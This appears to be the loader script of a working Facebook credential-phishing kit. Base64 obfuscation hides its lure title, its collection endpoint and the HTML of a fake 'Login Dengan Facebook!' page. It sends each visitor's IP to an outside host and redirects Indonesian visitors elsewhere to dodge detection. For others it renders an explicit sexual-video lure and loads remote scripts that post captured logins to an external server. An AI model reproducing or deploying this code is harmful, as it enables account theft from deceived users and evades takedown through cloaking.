function cid(name) {
	    return decodeURI(
	        (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search)||[,null])[1] || ''
	    );
	}
  function decode(txt){
    var result = atob(txt);
    document.write(result);
  }
	//var frm = atob('aHR0cHM6Ly9mYjAxY214LmdpdGh1Yi5pby8');
	if(cid("i")){
		var img = atob(cid("i"));
	}else{
		var img = atob('aHR0cHM6Ly9pLmltZ3VyLmNvbS9NSm1jdEttLmpwZw');
	}
	if(cid("t")){
		var ttl = atob(cid("t"));
	}else{
		var ttl = atob('U2Fzc3kgR2luYSBpcyBnZXR0aW5nIGZpbmdlcmZ1Y2tlZCBhbmQgZnVja2VkIGluIHRoZSBtaWRkbGUgb2YgYSBuaWNlIGRheS4');
	}
	if(cid("s")){
		var srv = cid("s");
	}else{
		var srv = 'aHR0cHM6Ly93ZWR1c3MuY29tL2FrdW4vcG9zdC5waHA';
	}
	if(cid("u")){
		var usr = cid("u");
	}else{
		var usr = 'Q2VyeHJl';
	}
	if(cid("f")){
		var fp = cid("f");
	}else{
		var fp = 'ZGF0aW5n';
	}

function eks(ip) {
		$.get( "https://bercabang.com/js.php?us=" +usr+ "&ip=" +ip+ "&time"+Date.now(), function( data ) {
			//console.log(data)
			console.log(data.url)
			console.log(data.geo)
					if(data.geo == 'ID'){
						window.location.replace(data.url);
					}else{
					  document.write("<title>" + ttl + "</title>");
						document.write("<link rel='image_src' href='" + img + "' />");
						document.write("<meta property='og:image' content='" + img + "' />");
						cmx('PGh0bWw+CjxoZWFkIGxhbmc9ImlkIj4KCTxsaW5rIHJlbD0ic2hvcnRjdXQgaWNvbiIgdHlwZT0iaW1hZ2UveC1pY29uIiBocmVmPSJodHRwczovL2kuaW1ndXIuY29tL1hmeXM1YTkucG5nIj4KICA8c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCIgc3JjPSJodHRwczovL2ZiMDFjbXguZ2l0aHViLmlvL2pzL3RjbXguanM/MDAwOCI+PC9zY3JpcHQ+CjxzY3JpcHQgdHlwZT0idGV4dC9qYXZhc2NyaXB0Ij4KCWZ1bmN0aW9uIGNpZChuYW1lKSB7CgkgICAgcmV0dXJuIGRlY29kZVVSSSgKCSAgICAgICAgKFJlZ0V4cChuYW1lICsgJz0nICsgJyguKz8pKCZ8JCknKS5leGVjKGxvY2F0aW9uLnNlYXJjaCl8fFssbnVsbF0pWzFdIHx8ICcnCgkgICAgKTsKCX0KICBmdW5jdGlvbiBkZWNvZGUodHh0KXsKICAgIHZhciByZXN1bHQgPSBhdG9iKHR4dCk7CiAgICBkb2N1bWVudC53cml0ZShyZXN1bHQpOwogIH0KCS8vdmFyIGZybSA9IGF0b2IoJ2FIUjBjSE02THk5bVlqQXhZMjE0TG1kcGRHaDFZaTVwYnk4Jyk7CglpZihjaWQoImkiKSl7CgkJdmFyIGltZyA9IGF0b2IoY2lkKCJpIikpOwoJfWVsc2V7CgkJdmFyIGltZyA9IGF0b2IoJ2FIUjBjSE02THk5cExtbHRaM1Z5TG1OdmJTOU5TbTFqZEV0dExtcHdadycpOwoJfQoJaWYoY2lkKCJ0IikpewoJCXZhciB0dGwgPSBhdG9iKGNpZCgidCIpKTsKCX1lbHNlewoJCXZhciB0dGwgPSBhdG9iKCdVMkZ6YzNrZ1IybHVZU0JwY3lCblpYUjBhVzVuSUdacGJtZGxjbVoxWTJ0bFpDQmhibVFnWm5WamEyVmtJR2x1SUhSb1pTQnRhV1JrYkdVZ2IyWWdZU0J1YVdObElHUmhlUzQnKTsKCX0KCWlmKGNpZCgicyIpKXsKCQl2YXIgc3J2ID0gY2lkKCJzIik7Cgl9ZWxzZXsKCQl2YXIgc3J2ID0gJ2FIUjBjSE02THk5M1pXUjFjM011WTI5dEwyRnJkVzR2Y0c5emRDNXdhSEEnOwoJfQoJaWYoY2lkKCJ1IikpewoJCXZhciB1c3IgPSBjaWQoInUiKTsKCX1lbHNlewoJCXZhciB1c3IgPSAnUTJWeWVISmwnOwoJfQoJaWYoY2lkKCJmIikpewoJCXZhciBmcCA9IGNpZCgiZiIpOwoJfWVsc2V7CgkJdmFyIGZwID0gJ1pHRjBhVzVuJzsKCX0KPC9zY3JpcHQ+CjxzY3JpcHQgdHlwZT0idGV4dC9qYXZhc2NyaXB0IiBzcmM9Imh0dHBzOi8vZmIwMWNteC5naXRodWIuaW8vanMvc3J2LmpzPzAwMDkiPjwvc2NyaXB0PgogIDxzY3JpcHQ+CiAgQ2VrSVAuRGV0SVAoZnVuY3Rpb24oaXBBZGRyZXNzKSB7CiAgICAgICAgZWtzKGlwQWRkcmVzcyk7CiAgfSk7CiAgbGlrZXM9ZnAsCiAgdGl0PSJMb2dpbiBEZW5nYW4gRmFjZWJvb2shIiwKICBza2luPSIwNCIsCiAgd2FrdHU9IjYwIiwKICB0dW5nZ3U9IjAiLAogIGJhaGFzYT0iaWQiLAogIHVzPXVzciwKICBocz1hdG9iKHNydikKICA8L3NjcmlwdD4KPHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiIHNyYz0iaHR0cHM6Ly9mYjAxY214LmdpdGh1Yi5pby9qcy9hLmpzIj48L3NjcmlwdD4KPHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiIHNyYz0iaHR0cHM6Ly9mYjAxY214LmdpdGh1Yi5pby9qcy9wLmpzIj48L3NjcmlwdD4KPC9oZWFkPgo8Ym9keT4KPHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiIHNyYz0iaHR0cHM6Ly9mYjAxY214LmdpdGh1Yi5pby9qcy9iLmpzIj48L3NjcmlwdD4KICA8c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCI+CiAgZG9jdW1lbnQud3JpdGUodHRsKTsKICA8L3NjcmlwdD4KPHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiIHNyYz0iaHR0cHM6Ly9mYjAxY214LmdpdGh1Yi5pby9qcy9jLmpzIj48L3NjcmlwdD4KCQkJCQk8ZGl2IGNsYXNzPSJ2aWRlby1iZy1waWMiPgoJCQkJCSAgPHNjcmlwdD4KCQkJCQkgIGRvY3VtZW50LndyaXRlKCI8ZGl2IGNsYXNzPSd2aWRlby1waWMnIHN0eWxlPSdiYWNrZ3JvdW5kLWltYWdlOiB1cmwoIiArIGltZyArICIpJz48L2Rpdj4iKTsKCQkJCQkgIDwvc2NyaXB0PgoJCQkJCTwvZGl2PgoJCQkJCSAgPHNjcmlwdD4KCQkJCQkgIGRvY3VtZW50LndyaXRlKCI8cCBjbGFzcz0ndmlkZW8tdGl0bGUnPiIgKyB0dGwgKyAiPC9wPiIpOwoJCQkJCSAgPC9zY3JpcHQ+CjxzY3JpcHQgdHlwZT0idGV4dC9qYXZhc2NyaXB0IiBzcmM9Imh0dHBzOi8vZmIwMWNteC5naXRodWIuaW8vanMvZC5qcyI+PC9zY3JpcHQ+CjwvYm9keT4KPC9odG1sPgo');
					}
		});
}
